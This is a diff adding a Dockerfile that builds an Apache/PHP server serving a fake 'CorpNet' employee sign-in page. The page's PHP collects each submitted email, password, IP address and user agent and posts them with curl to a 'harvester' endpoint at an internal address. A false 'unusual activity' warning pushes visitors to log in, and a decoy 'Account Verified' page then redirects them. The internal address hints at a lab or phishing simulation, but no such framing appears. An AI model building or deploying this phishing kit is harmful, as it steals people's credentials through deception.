@@ -1,0 +1,112 @@
+FROM ubuntu:22.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+
+RUN apt-get update && apt-get install -y \
+    apache2 \
+    php \
+    libapache2-mod-php \
+    && rm -rf /var/lib/apt/lists/*
+
+# Corporate login landing page
+RUN cat > /var/www/html/index.php << 'PHP'
+<?php
+$harvester_url = "http://10.0.8.30:8080/harvest";
+if(isset($_POST['email'])) {
+    $data = array(
+        'email' => $_POST['email'],
+        'password' => $_POST['password'],
+        'timestamp' => date('Y-m-d H:i:s'),
+        'ip' => $_SERVER['REMOTE_ADDR'],
+        'user_agent' => $_SERVER['HTTP_USER_AGENT']
+    );
+    $ch = curl_init($harvester_url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_exec($ch);
+    curl_close($ch);
+    header("Location: /thanks.php");
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CorpNet Portal - Sign In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+               min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .login-card { background: white; border-radius: 12px; padding: 40px; width: 100%; max-width: 420px;
+                     box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo h1 { color: #1a1a2e; font-size: 24px; margin-bottom: 5px; }
+        .logo p { color: #666; font-size: 14px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 6px; color: #333; font-weight: 500; font-size: 14px; }
+        .form-group input { width: 100%; padding: 14px 16px; border: 2px solid #e0e0e0; border-radius: 8px;
+                           font-size: 16px; transition: border-color 0.3s; }
+        .form-group input:focus { outline: none; border-color: #0066cc; }
+        .btn { width: 100%; padding: 14px; background: #0066cc; color: white; border: none; border-radius: 8px;
+              font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
+        .btn:hover { background: #0052a3; }
+        .footer { text-align: center; margin-top: 20px; color: #999; font-size: 12px; }
+        .warning { background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; padding: 12px;
+                  margin-bottom: 20px; font-size: 13px; color: #856404; }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="logo">
+            <h1>🏢 CorpNet</h1>
+            <p>Employee Portal</p>
+        </div>
+        <div class="warning">
+            ⚠️ <strong>Security Notice:</strong> Unusual activity detected on your account. Please verify your credentials.
+        </div>
+        <form method="POST">
+            <div class="form-group">
+                <label>Email Address</label>
+                <input type="email" name="email" placeholder="you@corpcorp.local" required>
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="btn">Sign In</button>
+        </form>
+        <div class="footer">
+            <p>© 2024 CorpNet Inc. All rights reserved.</p>
+            <p style="margin-top:5px;"><a href="#" style="color:#0066cc;">Forgot password?</a></p>
+        </div>
+    </div>
+</body>
+</html>
+PHP
+
+RUN cat > /var/www/html/thanks.php << 'PHP'
+<!DOCTYPE html>
+<html>
+<head><title>CorpNet - Verified</title>
+<meta http-equiv="refresh" content="3;url=https://corpcorp.local">
+<style>
+body { font-family: Arial; display: flex; align-items: center; justify-content: center; min-height: 100vh;
+       background: #f5f5f5; }
+.box { text-align: center; padding: 40px; background: white; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+</style>
+</head>
+<body>
+<div class="box">
+    <h2>✅ Account Verified</h2>
+    <p>Redirecting to your dashboard...</p>
+</div>
+</body>
+</html>
+PHP
+
+EXPOSE 80
+
+CMD ["apachectl", "-D", "FOREGROUND"]
